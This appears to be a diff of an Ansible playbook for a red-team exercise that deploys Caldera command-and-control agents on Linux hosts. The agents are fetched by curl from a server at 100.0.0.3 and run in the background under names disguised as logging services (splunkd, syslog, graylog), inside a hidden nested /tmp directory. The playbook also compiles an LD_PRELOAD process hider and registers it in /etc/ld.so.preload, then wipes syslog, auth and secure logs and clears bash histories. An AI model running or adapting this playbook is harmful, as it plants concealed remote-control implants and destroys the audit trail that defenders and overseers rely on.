@@ -1,6 +1,173 @@
-server="http://100.0.0.3:8888";curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > splunkd;chmod +x splunkd;nohup ./splunkd -server "$server" -group red >/dev/null 2>&1 &
+---
+- name: Deploy Caldera agents and process hider on Linux hosts
+  hosts: linux
+  become: yes
+  gather_facts: yes
+
+  vars:
+    # Base directory where tools are hidden
+    deploy_base_dir: "/tmp/.syslogd_backup"
+    # Generate three random folder names (each 4 random characters)
+    random_folder1: "{{ lookup('password', '/dev/null', 'length=4', 'chars=ascii_letters') }}"
+    random_folder2: "{{ lookup('password', '/dev/null', 'length=4', 'chars=ascii_letters') }}"
+    random_folder3: "{{ lookup('password', '/dev/null', 'length=4', 'chars=ascii_letters') }}"
+    # Final hidden directory (nested three levels deep)
+    deploy_dir: "{{ deploy_base_dir }}/{{ random_folder1 }}/{{ random_folder2 }}/{{ random_folder3 }}"
+
+    # Caldera server URL; change as appropriate
+    server: "http://100.0.0.3:8888"
+
+    # Agent names are divided into groups.
+    # HTTP Sandcat agents (default)
+    http_agents:
+      - splunkd
+      - splunk
+      - syslog
+      - graylog
+      - log
+      - notlog
+      - notlog-http
+    # HTML RagDoll agents
+    html_agents:
+      - notlog-html
+      - syslog-html
+      - log-html
+      - ragdoll
+    # Manx TCP agents
+    tcp_agents:
+      - notlog-tcp
+      - syslog-tcp
+      - log-tcp
+      - splunk-tcp
+
+    agent_names: "{{ http_agents + html_agents + tcp_agents }}"
+
+    purge_logs: true
+
+    tcp_socket: "100.0.0.3:7010"
+    tcp_contact: "tcp"
+
+  tasks:
+    - name: Install python3 and python3-pip
+      package:
+        name:
+          - python3
+          - python3-pip
+        state: present
+
+    - name: Create base hidden deployment directory
+      file:
+        path: "{{ deploy_base_dir }}"
+        state: directory
+        mode: "0755"
+
+    - name: Create nested hidden deployment directory
+      file:
+        path: "{{ deploy_dir }}"
+        state: directory
+        mode: "0755"
 
 
-server="http://100.0.0.3:8888";curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > graylog;chmod +x graylog;nohup ./graylog -server "$server" -group red >/dev/null 2>&1 &
+    ###################################################################
+    # Deploy multiple Caldera agents based on agent name (in background)
+    ###################################################################
+    - name: Deploy Caldera agents based on agent names
+      shell: |
+        cd {{ deploy_dir }}
+        # Deploy HTTP Sandcat agents
+        if [[ "{{ item }}" =~ ^(splunkd|splunk|syslog|graylog|log|notlog|notlog-http)$ ]]; then
+          curl -s -X POST -H "file:sandcat.go" -H "platform:linux" {{ server }}/file/download > {{ item }}
+          chmod +x {{ item }}
+          nohup ./{{ item }} -server {{ server }} -group red >/dev/null 2>&1 &
+        # Deploy HTML RagDoll agents
+        elif [[ "{{ item }}" =~ ^(notlog-html|syslog-html|log-html|ragdoll)$ ]]; then
+          curl -s -X POST -H "file:ragdoll.go" -H "platform:linux" {{ server }}/file/download > {{ item }}
+          chmod +x {{ item }}
+          nohup ./{{ item }} -server {{ server }} -group red -html >/dev/null 2>&1 &
+        # Deploy Manx TCP agents
+        elif [[ "{{ item }}" =~ ^(notlog-tcp|syslog-tcp|log-tcp|splunk-tcp)$ ]]; then
+          curl -s -X POST -H "file:manx.go" -H "platform:linux" {{ server }}/file/download > {{ item }}
+          chmod +x {{ item }}
+          nohup ./{{ item }} -server {{ server }} -socket {{ tcp_socket }} -contact {{ tcp_contact }} >/dev/null 2>&1 &
+        else
+          # Default to HTTP Sandcat agent if none of the above match
+          curl -s -X POST -H "file:sandcat.go" -H "platform:linux" {{ server }}/file/download > {{ item }}
+          chmod +x {{ item }}
+          nohup ./{{ item }} -server {{ server }} -group red >/dev/null 2>&1 &
+        fi
+      args:
+        chdir: "{{ deploy_dir }}"
+      loop: "{{ agent_names }}"
 
-server="http://100.0.0.3:8888";socket="100.0.0.3:7010";contact="tcp";curl -s -X POST -H "file:manx.go" -H "platform:linux" $server/file/download > syslog;chmod +x syslog;nohup ./syslog -http $server -socket $socket -contact $contact >/dev/null 2>&1 &
+    ###################################################################
+    # 5) Copy and build the process hider
+    ###################################################################
+    - name: Copy processhider.c from hideprocesses folder
+      copy:
+        src: ../hideprocesses/processhider.c
+        dest: "{{ deploy_dir }}/processhider.c"
+        mode: "0644"
+
+    - name: Copy Makefile from hideprocesses folder
+      copy:
+        src: ../hideprocesses/Makefile
+        dest: "{{ deploy_dir }}/Makefile"
+        mode: "0644"
+
+    - name: Build process hider via make
+      command: make
+      args:
+        chdir: "{{ deploy_dir }}"
+      ignore_errors: yes
+
+    - name: Compile process hider (fallback if make did not work)
+      shell: gcc -Wall -fPIC -shared -o process.so processhider.c -ldl
+      args:
+        chdir: "{{ deploy_dir }}"
+      ignore_errors: yes
+
+    - name: Move process.so to /usr/local/lib and update ld.so.preload
+      shell: |
+        mv {{ deploy_dir }}/process.so /usr/local/lib/ 2>/dev/null || true
+        grep -qxF "/usr/local/lib/process.so" /etc/ld.so.preload || echo "/usr/local/lib/process.so" >> /etc/ld.so.preload
+
+    ###################################################################
+    # 6) Cleanup: Remove the hidden deployment directory and clear logs/history
+    ###################################################################
+    - name: Remove processhider.c after build
+      file:
+        path: "{{ deploy_dir }}/processhider.c"
+        state: absent
+
+    - name: Remove Makefile after build
+      file:
+        path: "{{ deploy_dir }}/Makefile"
+        state: absent
+
+
+    - block:
+        - name: Truncate syslog (Debian/Ubuntu)
+          shell: "truncate -s 0 /var/log/syslog 2>/dev/null || true"
+          when: ansible_facts['os_family'] == "Debian"
+
+        - name: Truncate auth.log (Debian/Ubuntu)
+          shell: "truncate -s 0 /var/log/auth.log 2>/dev/null || true"
+          when: ansible_facts['os_family'] == "Debian"
+
+        - name: Truncate messages (Rocky/RedHat)
+          shell: "truncate -s 0 /var/log/messages 2>/dev/null || true"
+          when: ansible_facts['os_family'] == "RedHat"
+
+        - name: Truncate secure (Rocky/RedHat)
+          shell: "truncate -s 0 /var/log/secure 2>/dev/null || true"
+          when: ansible_facts['os_family'] == "RedHat"
+
+        - name: Clear root bash history
+          shell: |
+            [ -f /root/.bash_history ] && cat /dev/null > /root/.bash_history 2>/dev/null || true
+            history -c 2>/dev/null || true
+            history -w 2>/dev/null || true
+        - name: Clear primary user's bash history (john_hammond)
+          shell: |
+            [ -f /home/john_hammond/.bash_history ] && cat /dev/null > /home/john_hammond/.bash_history 2>/dev/null || true
+      when: purge_logs
